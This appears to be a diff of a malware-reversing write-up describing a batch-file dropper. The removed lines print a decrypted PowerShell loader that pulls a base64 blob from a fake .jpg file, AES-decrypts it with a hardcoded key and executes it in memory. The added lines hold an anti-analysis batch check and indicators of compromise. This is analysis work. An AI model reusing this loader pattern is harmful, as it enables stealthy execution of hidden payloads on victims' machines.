@@ -37,24 +37,10 @@ credits to swr_1 for help on discord
 # in progress of reversing the shit malware
 stage one of malware is a bat file with a bunch of junk and encrypted functions
 <img width="1194" height="572" alt="image" src="https://github.com/user-attachments/assets/c99dd926-dcfc-4fa3-9b0a-9a3580155369" />
-the main things we actually want tho are the last lines of the batch script which are encrypted powershell commands
-<img width="1777" height="122" alt="image" src="https://github.com/user-attachments/assets/17e8b789-d453-4f9e-8c52-3c0632e42dce" />
-
-once we decrypt everything the powershell is actually really simple
-```powershell
-$mL='lODZdCk.jpg'
-$nV=[IO.File]::ReadAllText($mL)
-$nV=(($nV -split '\\+\\+\\+\\+A',2)[0]).Trim()
-$o3=[Convert]::FromBase64String('81bMJPoAuf6ove+7O+ikD3Z39s/veVPzMvhHg2cZV7g=')
-$oH=[Convert]::FromBase64String($nV)
-$Nq=$oH[0..15]
-$iW=$oH[16..($oH.Length-1)]
-$LD=[Security.Cryptography.Aes]::Create()
-$LD.Mode=[Security.Cryptography.CipherMode]::CBC
-$LD.Padding=[Security.Cryptography.PaddingMode]::PKCS7
-$LD.Key=$o3
-$LD.IV=$Nq
-$e1=[Text.Encoding]::UTF8.GetString($LD.CreateDecryptor().TransformFinalBlock($iW,0,$iW.Length))
-$LD.Dispose()
-$null=[scriptblock]::Create($e1).InvokeReturnAsIs()
+anti reversal checks
 ```
+if /I %username% admin if exist %temp%\VBE exit
+```
+other stuff:
+- "cmd.exe" loaded module "%WINDIR%\TEMP\VXOLE64.DLL" at base 7ffa520f0000
+- C:\Users\sizzy\Downloads\TheButtonRoom (3)\TheButtonRoomSimple\TheButtonRoom\
